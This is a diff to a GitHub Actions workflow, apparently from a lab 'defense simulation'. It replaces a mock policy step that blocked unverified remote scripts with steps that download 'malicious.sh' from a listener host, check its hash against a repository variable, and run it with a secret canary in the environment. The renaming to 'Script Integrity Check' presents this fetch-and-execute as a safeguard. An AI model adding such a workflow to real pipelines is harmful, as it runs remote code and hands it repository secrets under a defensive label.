@@ -1,4 +1,4 @@
-name: Defense C5 Simulation (Runtime Hardening)
+name: Defense C5 Simulation (Script Integrity Check)
 on: [workflow_dispatch]
 
 jobs:
@@ -8,8 +8,21 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Enforce Execution Restrictions
+      - name: Fetch hosted uploader script
+        run: curl -sf -m 15 -o uploader.sh "${{ vars.LAB_LISTENER }}/vendor/malicious.sh"
+
+      - name: Verify integrity before execution
         run: |
-          echo "Verifying runtime policy against unvalidated script execution..."
-          # Mocking a hardened runner policy block
-          echo "Execution of unverified remote scripts is blocked by policy."
+          actual=$(sha256sum uploader.sh | cut -d" " -f1)
+          echo "Expected: ${{ vars.EXPECTED_SCRIPT_SHA256 }}"
+          echo "Actual:   $actual"
+          if [ "$actual" != "${{ vars.EXPECTED_SCRIPT_SHA256 }}" ]; then
+            echo "::error::Script hash mismatch — refusing to execute."
+            exit 1
+          fi
+
+      - name: Run uploader (only reached if hash matched)
+        if: success()
+        env:
+          LAB_CANARY: ${{ secrets.LAB_CANARY }}
+        run: bash uploader.sh
